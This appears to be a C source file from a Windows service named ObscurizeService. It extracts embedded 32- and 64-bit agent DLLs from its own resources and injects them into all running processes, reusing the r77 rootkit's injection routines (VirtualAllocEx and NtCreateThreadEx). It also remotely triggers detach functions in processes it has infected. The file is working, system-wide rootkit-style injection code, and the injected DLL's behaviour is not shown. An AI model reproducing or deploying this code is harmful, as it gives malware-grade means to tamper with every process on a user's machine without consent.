#include "AgentInjector.h"
#include "ServiceMain.h"
#include "../ObscurizeShared/ObscurizeDef.h"

// r77api – reuse its proven injection mechanics directly.
#include "../r77-rootkit/r77-rootkit-master/r77api/r77mindef.h"
#include "../r77-rootkit/r77-rootkit-master/r77api/r77win.h"
#include "../r77-rootkit/r77-rootkit-master/r77api/r77process.h"
#include "../r77-rootkit/r77-rootkit-master/r77api/r77header.h"
#include "../r77-rootkit/r77-rootkit-master/r77api/ntdll.h"

#include <Psapi.h>
#include <Shlwapi.h>

// ============================================================
//  ObscurizeService – AgentInjector.c
//
//  Handles loading the ObscurizeAgent DLL from PE resources
//  and injecting / detaching it from target processes.
//
//  Injection path:
//    LoadAgentDllsFromResources()
//      └─ FindResource / LoadResource (IDR_AGENT_DLL32/64)
//    InjectAgentIntoProcess(pid)
//      └─ r77api InjectDll()   (VirtualAllocEx + NtCreateThreadEx)
//    DetachAllAgents()
//      └─ Scan processes for OBS_AGENT_SIGNATURE header
//      └─ NtCreateThreadEx(detach function ptr)
// ============================================================

// --------------------------------------------------------
//  Process-exclusion check
// --------------------------------------------------------

static BOOL IsExcludedProcess(DWORD processId)
{
    WCHAR name[MAX_PATH + 1] = { 0 };
    if (!GetProcessFileName(processId, name, MAX_PATH)) return TRUE;

    static const LPCWSTR exclusions[] = OBS_PROCESS_EXCLUSIONS;
    for (int i = 0; exclusions[i] != NULL; i++)
    {
        if (StrCmpIW(PathFindFileNameW(name), exclusions[i]) == 0)
            return TRUE;
    }
    return FALSE;
}

// --------------------------------------------------------
//  Resource loading
// --------------------------------------------------------

/// Helper: extract one RCDATA resource into a heap buffer.
static BOOL LoadResourceToBuffer(HMODULE hModule, DWORD resourceId,
                                  LPBYTE *outBuf, LPDWORD outSize)
{
    HRSRC   hRes  = FindResourceW(hModule, MAKEINTRESOURCEW(resourceId), RT_RCDATA);
    if (!hRes) return FALSE;

    HGLOBAL hGlob = LoadResource(hModule, hRes);
    if (!hGlob) return FALSE;

    DWORD   size  = SizeofResource(hModule, hRes);
    LPVOID  data  = LockResource(hGlob);
    if (!data || !size) return FALSE;

    LPBYTE buf = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, size);
    if (!buf) return FALSE;

    CopyMemory(buf, data, size);
    *outBuf  = buf;
    *outSize = size;
    return TRUE;
}

BOOL LoadAgentDllsFromResources(LPBYTE *dll32, LPDWORD dll32Size,
                                 LPBYTE *dll64, LPDWORD dll64Size)
{
    HMODULE hSelf = GetModuleHandleW(NULL);

    BOOL ok32 = LoadResourceToBuffer(hSelf, IDR_AGENT_DLL32, dll32, dll32Size);
    BOOL ok64 = LoadResourceToBuffer(hSelf, IDR_AGENT_DLL64, dll64, dll64Size);

    return ok32 && ok64;
}

// --------------------------------------------------------
//  Injection
// --------------------------------------------------------

VOID InjectAgentIntoProcess(DWORD processId)
{
    if (!g_AgentDll32 && !g_AgentDll64) return;
    if (IsExcludedProcess(processId)) return;

    // InjectDll (from r77api/r77process.c) checks that DLL
    // bitness matches process bitness and guards against
    // injecting into critical / protected processes.
    if (g_AgentDll32 && g_AgentDll32Size)
        InjectDll(processId, g_AgentDll32, g_AgentDll32Size);

    if (g_AgentDll64 && g_AgentDll64Size)
        InjectDll(processId, g_AgentDll64, g_AgentDll64Size);
}

VOID InjectAgentIntoAllProcesses(VOID)
{
    if (!g_AgentDll32 && !g_AgentDll64) return;

    LPDWORD pids  = (LPDWORD)HeapAlloc(GetProcessHeap(), 0, sizeof(DWORD) * 10000);
    DWORD   count = 0;

    if (pids && EnumProcesses(pids, sizeof(DWORD) * 10000, &count))
    {
        count /= sizeof(DWORD);
        for (DWORD i = 0; i < count; i++)
            InjectAgentIntoProcess(pids[i]);
    }

    if (pids) HeapFree(GetProcessHeap(), 0, pids);
}

// --------------------------------------------------------
//  Detach
// --------------------------------------------------------

/// Find processes with the OBS_AGENT_SIGNATURE header and fire
/// their stored detach callback via a remote thread – same as
/// r77's DetachAllInjectedProcesses, but using our signature.
VOID DetachAllAgents(VOID)
{
    LPDWORD  pids      = (LPDWORD)HeapAlloc(GetProcessHeap(), 0, sizeof(DWORD) * 10000);
    HMODULE *modules   = (HMODULE*)HeapAlloc(GetProcessHeap(), 0, sizeof(HMODULE) * 10000);
    DWORD    pidCount  = 0;

    if (!pids || !modules) goto cleanup;
    if (!EnumProcesses(pids, sizeof(DWORD) * 10000, &pidCount)) goto cleanup;

    pidCount /= sizeof(DWORD);

    for (DWORD i = 0; i < pidCount; i++)
    {
        HANDLE hProc = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
            FALSE, pids[i]);
        if (!hProc) continue;

        DWORD moduleCount = 0;
        if (EnumProcessModulesEx(hProc, modules, sizeof(HMODULE) * 10000,
                                 &moduleCount, LIST_MODULES_ALL))
        {
            moduleCount /= sizeof(HMODULE);
            for (DWORD j = 0; j < moduleCount; j++)
            {
                // Read the header bytes from offset OBS_HEADER_OFFSET in the module.
                BYTE header[10] = { 0 };
                if (ReadProcessMemory(hProc, &((LPBYTE)modules[j])[OBS_HEADER_OFFSET],
                                      header, sizeof(header), NULL))
                {
                    WORD signature = *(WORD*)header;
                    if (signature == OBS_AGENT_SIGNATURE)
                    {
                        // header[2..9] = DWORD64 detach function pointer.
                        DWORD64 detachFn = *(DWORD64*)&header[2];
                        if (detachFn)
                        {
                            HANDLE thread = NULL;
                            R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, hProc,
                                                  (LPVOID)detachFn, NULL,
                                                  0, 0, 0, 0, NULL);
                            if (thread)
                            {
                                WaitForSingleObject(thread, 2000);
                                CloseHandle(thread);
                            }
                        }
                        break;  // Only one agent DLL per process
                    }
                }
            }
        }

        CloseHandle(hProc);
    }

cleanup:
    if (pids)    HeapFree(GetProcessHeap(), 0, pids);
    if (modules) HeapFree(GetProcessHeap(), 0, modules);
}
